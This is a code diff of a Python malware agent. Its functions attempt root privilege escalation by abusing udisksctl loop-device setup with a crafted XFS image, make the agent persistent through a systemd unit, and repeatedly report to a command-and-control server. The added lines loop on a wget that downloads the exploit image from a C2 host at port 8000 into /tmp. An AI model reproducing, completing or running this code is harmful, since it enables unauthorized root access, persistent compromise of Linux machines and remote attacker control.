@@ -110,7 +110,7 @@ def try_escalation():
     run_command(["killall", "-KILL", "gvfs-udisks2-volume-monitor"])
 
     # 2. Set up loop device with udisksctl
-    udisks_output = run_command("udisksctl loop-setup --file ./xfs.image --no-user-interaction", shell=True)
+    udisks_output = run_command("udisksctl loop-setup --file /tmp/xfs.image --no-user-interaction", shell=True)
 
     # Extract loop device name (e.g. loop2)
     match = re.search(r'/dev/(loop\d+)', udisks_output)
@@ -144,9 +144,6 @@ def try_escalation():
 
 def make_permanent():
     print("[*] Making the agent persistent...")
-    print(" the current user is: ", getpass.getuser())
-    print(" the current uid is: ", os.getuid())
-    print(" the current gid is: ", os.geteuid())
     if (os.geteuid() != 0):
         if (try_escalation() == True):
             exit(0)
@@ -177,6 +174,15 @@ WantedBy=multi-user.target
         exit(0)
 
 if __name__ == "__main__":
+    # pull from the C2_IP variable a file named xfs.image (it is a python server) try until you download it    
+    if not os.path.exists("/tmp/xfs.image"):
+        print("[*] Downloading xfs.image from C2...")
+        while not os.path.exists("/tmp/xfs.image"):
+            try:
+                subprocess.run(["wget", f"http://{C2_IP}:8000/xfs.image", "-O", "/tmp/xfs.image"])
+            except subprocess.CalledProcessError as e:
+                print(f"[!] Failed to download xfs.image: {e}")
+                time.sleep(5)
     make_permanent()
     while True:
         send_to_c2()
